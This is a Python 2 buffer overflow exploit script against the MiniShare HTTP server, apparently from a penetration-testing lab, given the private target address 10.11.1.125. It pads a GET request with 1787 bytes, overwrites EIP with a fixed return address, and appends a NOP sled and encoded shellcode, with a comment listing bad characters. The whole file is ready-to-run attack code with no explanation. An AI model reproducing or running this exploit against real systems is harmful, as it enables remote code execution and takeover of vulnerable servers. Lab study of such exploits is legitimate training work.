#!/usr/bin/env python2
import socket

payload = "\x41" * 1787
eip = "\x03\x32\x9E\x7C" #7C9E3203
nopsled = "\x90" * 20
exploit = ("\xbe\x66\x74\xea\xdf\xda\xda\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x70\x12\x83\xc0\x04\x03\x16\x7a\x08\x2a\x2a\x6a\x4e"
"\xd5\xd2\x6b\x2f\x5f\x37\x5a\x6f\x3b\x3c\xcd\x5f\x4f\x10\xe2"
"\x14\x1d\x80\x71\x58\x8a\xa7\x32\xd7\xec\x86\xc3\x44\xcc\x89"
"\x47\x97\x01\x69\x79\x58\x54\x68\xbe\x85\x95\x38\x17\xc1\x08"
"\xac\x1c\x9f\x90\x47\x6e\x31\x91\xb4\x27\x30\xb0\x6b\x33\x6b"
"\x12\x8a\x90\x07\x1b\x94\xf5\x22\xd5\x2f\xcd\xd9\xe4\xf9\x1f"
"\x21\x4a\xc4\xaf\xd0\x92\x01\x17\x0b\xe1\x7b\x6b\xb6\xf2\xb8"
"\x11\x6c\x76\x5a\xb1\xe7\x20\x86\x43\x2b\xb6\x4d\x4f\x80\xbc"
"\x09\x4c\x17\x10\x22\x68\x9c\x97\xe4\xf8\xe6\xb3\x20\xa0\xbd"
"\xda\x71\x0c\x13\xe2\x61\xef\xcc\x46\xea\x02\x18\xfb\xb1\x4a"
"\xed\x36\x49\x8b\x79\x40\x3a\xb9\x26\xfa\xd4\xf1\xaf\x24\x23"
"\xf5\x85\x91\xbb\x08\x26\xe2\x92\xce\x72\xb2\x8c\xe7\xfa\x59"
"\x4c\x07\x2f\xcd\x1c\xa7\x80\xae\xcc\x07\x71\x47\x06\x88\xae"
"\x77\x29\x42\xc7\x12\xd0\x05\xe2\xe9\xda\xbe\x9a\xef\xda\x41"
"\xe0\x79\x3c\x2b\x06\x2c\x97\xc4\xbf\x75\x63\x74\x3f\xa0\x0e"
"\xb6\xcb\x47\xef\x79\x3c\x2d\xe3\xee\xcc\x78\x59\xb8\xd3\x56"
"\xf5\x26\x41\x3d\x05\x20\x7a\xea\x52\x65\x4c\xe3\x36\x9b\xf7"
"\x5d\x24\x66\x61\xa5\xec\xbd\x52\x28\xed\x30\xee\x0e\xfd\x8c"
"\xef\x0a\xa9\x40\xa6\xc4\x07\x27\x10\xa7\xf1\xf1\xcf\x61\x95"
"\x84\x23\xb2\xe3\x88\x69\x44\x0b\x38\xc4\x11\x34\xf5\x80\x95"
"\x4d\xeb\x30\x59\x84\xaf\x41\x10\x84\x86\xc9\xfd\x5d\x9b\x97"
"\xfd\x88\xd8\xa1\x7d\x38\xa1\x55\x9d\x49\xa4\x12\x19\xa2\xd4"
"\x0b\xcc\xc4\x4b\x2b\xc5")
padding = "F" * 10
#bad chars: \x00; \x0d
MiniShareIP = "10.11.1.125"
MinisharePort = 123

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((MiniShareIP, MinisharePort))

s.sendall("GET "+payload+eip+nopsled+exploit+padding+" HTTP/1.1\r\nHost: "+MiniShareIP+"\r\n\r\n")
print s.recv(1024)
s.close()

